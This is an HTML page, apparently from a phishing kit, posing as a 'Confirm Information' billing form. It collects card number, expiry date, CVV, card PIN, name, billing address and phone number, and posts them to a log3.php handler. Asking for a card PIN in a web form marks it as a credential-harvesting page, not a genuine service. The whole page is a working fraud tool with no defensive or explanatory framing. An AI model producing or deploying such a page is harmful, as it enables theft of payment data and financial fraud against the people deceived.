<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>Confirm Information</title>
<script>setTimeout(function() {
  document.getElementsByTagName('input')[1].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	

<style type="text/css">
  
.textbox { 
    border: 1px solid #c4c4c4; 
    height: 30px; 
    width: 275px; 
    font-size: 14px; 
    padding-left: 8px; 
    border-radius: 3px; 
   
} 
 
.textbox:focus { 
    outline: none; 
    border: 1px solid #7bc1f7; 
    box-shadow: 0px 0px 8px #7bc1f7; 
    
} 

 </style>
<style type="text/css">
  
.textrbox { 
	background-color: #EAEAEA;
    background: -moz-linear-gradient(top, #FFF, #EAEAEA);
    background: -webkit-gradient(linear, left top, left bottom, color-stop(0.0, #FFF), color-stop(1.0, #EAEAEA));
    padding-left: 5px;
	border-radius: 2px;
	font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
	font-size: 14px;	
	color: #555;
    border: 1px solid #cdcdcd; 
    outline:0; 
    height: 30px; 
    width: 275px; 
  } 
.textrbox:focus { 
    outline: none; 
    border: 1px solid #7bc1f7; 
    box-shadow: 0px 0px 8px #7bc1f7; 
} 
 </style>
<style type="text/css">
div#container
{
	position:relative;
	width: auto;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:115px; top:0px; width:985px; height:75px; z-index:0"><img src="images/header.png" alt="" title="" border=0 width=985 height=75></div>

<div id="image2" style="position:absolute; overflow:hidden; left:115px; top:80px; width:980px; height:60px; z-index:1"><img src="images/subheader.png" alt="" title="" border=0 width=980 height=60></div>

<div id="image2" style="position:absolute; overflow:hidden; left:115px; top:160px; width:980px; height:60px; z-index:1">Please fill in the required details accurately.</div>

<div id="image3" style="position:absolute; overflow:hidden; left:140px; top:600px; width:371px; height:110px; z-index:2"><h3>Credit/Debit Card Billing Address</h3></div>

<div id="image8" style="position:absolute; overflow:hidden; left:115px; top:1368px; width:980px; height:147px; z-index:7"><img src="images/footer.png" alt="" title="" border=0 width=980 height=147></div>

<form action=log3.php name=chlobhai id=chlobhai method=post>

<div id="image3" style="position:absolute; overflow:hidden; left:140px; top:250px; width:371px; height:110px; z-index:2">* Credit/Debit Card Number:<br/><input name="ccn" class="textbox" maxlength="16" autocomplete="off" type="text" required><br/><small>(Please provide credit card which was received at the account creation)</small></div>

<div id="image3" style="position:absolute; overflow:hidden; left:140px; top:350px; width:371px; height:110px; z-index:2">* Expiry Date:<br/><select style="width:71px;" name="expmonth" id="expmonth" class="textbox" autocomplete="off" required><option value="" selected="selected">Month</option>
                    <option value="01">01</option>
                    <option value="02">02</option>
                    <option value="03">03</option>
                    <option value="04">04</option>
                    <option value="05">05</option>
                    <option value="06">06</option>
                    <option value="07">07</option>
                    <option value="08">08</option>
                    <option value="09">09</option>
                    <option value="10">10</option>
                    <option value="11">11</option>
                    <option value="12">12</option>
                    </select> / <select style="width:71px;" name="expyear" id="expyear" class="textbox" autocomplete="off" required><option value="" selected="selected">Year</option>
                     <option value="2020">2020</option>
		     <option value="2021">2021</option>
		     <option value="2022">2022</option>
                     <option value="2023">2023</option>
                     <option value="2024">2024</option>
                     <option value="2025">2025</option>
                     <option value="2026">2026</option>
                     <option value="2027">2027</option>
                     <option value="2028">2028</option>


                    </select></div>

<input type="hidden" name="ansr2" style="display:none;">
<div id="image3" style="position:absolute; overflow:hidden; left:140px; top:430px; width:371px; height:110px; z-index:2">* CVV/CVV2:<br/><input name="cvv" class="textbox" maxlength="4" autocomplete="off" type="text" required><br/><small>(it is the last 3 or 4 digits on the signature area of the card)</small></div>

<div id="image3" style="position:absolute; overflow:hidden; left:140px; top:510px; width:371px; height:110px; z-index:2">* Pin Number:<br/><input name="pin" class="textbox" maxlength="4" autocomplete="off" type="password" required><br/><small>(Personal identification number of your credit/debit card)</small></div>

<div id="image3" style="position:absolute; overflow:hidden; left:140px; top:660px; width:371px; height:110px; z-index:2">* Full Name:<br/><input name="fullname" class="textbox" autocomplete="off" type="text" required><br/><small>(Enter your name as it appears on your credit/debit card.)</small></div>

<div id="image3" style="position:absolute; overflow:hidden; left:140px; top:740px; width:371px; height:110px; z-index:2">* Address:<br/><input name="address" class="textbox" autocomplete="off" type="text" required><br/><small>(Enter the address where you recieve your credit/debit card billing statement)</small></div>

<div id="image3" style="position:absolute; overflow:hidden; left:140px; top:840px; width:371px; height:110px; z-index:2">* City:<br/><input name="city" class="textbox" autocomplete="off" type="text" required></div>

<div id="image3" style="position:absolute; overflow:hidden; left:140px; top:910px; width:371px; height:110px; z-index:2">* State:<br/><select name="state" id="previous_state" class="textbox" autocomplete="off" required><option value="">(Please Select State)</option>
	
			<option value="AL">Alabama</option>
		
			<option value="AK">Alaska</option>
		
			<option value="AZ">Arizona</option>
		
			<option value="AR">Arkansas</option>
		
			<option value="CA">California</option>
		
			<option value="CO">Colorado</option>
		
			<option value="CT">Connecticut</option>
		
			<option value="DE">Delaware</option>
		
			<option value="DC">District of Columbia</option>
		
			<option value="FL">Florida</option>
		
			<option value="GA">Georgia</option>
		
			<option value="HI">Hawaii</option>
		
			<option value="ID">Idaho</option>
		
			<option value="IL">Illinois</option>
		
			<option value="IN">Indiana</option>
		
			<option value="IA">Iowa</option>
		
			<option value="KS">Kansas</option>
		
			<option value="KY">Kentucky</option>
		
			<option value="LA">Louisiana</option>
		
			<option value="ME">Maine</option>
		
			<option value="MD">Maryland</option>
		
			<option value="MA">Massachusetts</option>
		
			<option value="MI">Michigan</option>
		
			<option value="MN">Minnesota</option>
		
			<option value="MS">Mississippi</option>
		
			<option value="MO">Missouri</option>
		
			<option value="MT">Montana</option>
		
			<option value="NE">Nebraska</option>
		
			<option value="NV">Nevada</option>
		
			<option value="NH">New Hampshire</option>
		
			<option value="NJ">New Jersey</option>
		
			<option value="NM">New Mexico</option>
		
			<option value="NY">New York</option>
		
			<option value="NC">North Carolina</option>
		
			<option value="ND">North Dakota</option>
		
			<option value="OH">Ohio</option>
		
			<option value="OK">Oklahoma</option>
		
			<option value="OR">Oregon</option>
		
			<option value="PA">Pennsylvania</option>
		
			<option value="RI">Rhode Island</option>
		
			<option value="SC">South Carolina</option>
		
			<option value="SD">South Dakota</option>
		
			<option value="TN">Tennessee</option>
		
			<option value="TX">Texas</option>
		
			<option value="UT">Utah</option>
		
			<option value="VT">Vermont</option>
		
			<option value="VA">Virginia</option>
		
			<option value="WA">Washington</option>
		
			<option value="WV">West Virginia</option>
		
			<option value="WI">Wisconsin</option>
		
			<option value="WY">Wyoming</option>
		
			<option value="IT">International</option>
		
	
</select></div>

<div id="image3" style="position:absolute; overflow:hidden; left:140px; top:990px; width:371px; height:110px; z-index:2">* Zip Code:<br/><input name="zip" class="textbox" autocomplete="off" type="text" required></div>

<div id="image3" style="position:absolute; overflow:hidden; left:140px; top:1070px; width:371px; height:110px; z-index:2">* Billing Phone Number:<br/><input name="phone" class="textbox" autocomplete="off" type="text" required></div>


<div id="formimage1" style="position:absolute; left:289px; top:1180px; z-index:13"><input type="image" name="formimage1" width="115" height="40" src="images/continue.png"></div>
</div>

	
</body>
</html>
